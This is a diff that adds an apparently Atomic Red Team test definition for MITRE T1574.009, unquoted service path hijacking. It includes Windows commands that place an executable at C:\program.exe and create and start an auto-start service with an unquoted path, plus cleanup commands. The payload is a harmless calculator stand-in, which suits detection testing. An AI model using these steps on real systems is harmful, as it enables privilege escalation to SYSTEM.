@@ -1,0 +1,31 @@
+attack_technique: T1574.009
+display_name: 'Hijack Execution Flow: Path Interception by Unquoted Path'
+atomic_tests:
+- name: Execution of program.exe as service with unquoted service path
+  auto_generated_guid: 2770dea7-c50f-457b-84c4-c40a47460d9f
+  description: |
+    When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability
+    known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
+    In this case, if an executable program.exe in C:\ exists, C:\program.exe will be executed instead of test.exe in C:\Program Files\subfolder\test.exe.
+  supported_platforms:
+  - windows
+  input_arguments:
+    service_executable:
+      description: Path of the executable used for the service and as the hijacked program.exe
+      type: path
+      default: C:\Windows\system32\mspaint.exe
+    malicious_executable:
+      description: Path of the executable which will hijack the service
+      type: path
+      default: C:\Windows\system32\win32calc.exe
+  executor:
+    command: |
+      copy #{service_executable} "C:\Program Files\mspaint.exe"
+      copy #{malicious_executable} "C:\program.exe"
+      sc create "Some Vulnerable Service" binpath= "C:\Program Files\calculator.exe" Displayname= "Vuln Service DP" start= auto
+      sc start "Some Vulnerable Service"
+    cleanup_command: |
+      sc delete "Some Vulnerable Service"
+      del "C:\Program Files\mspaint.exe"
+      del "C:\program.exe"
+    name: command_prompt
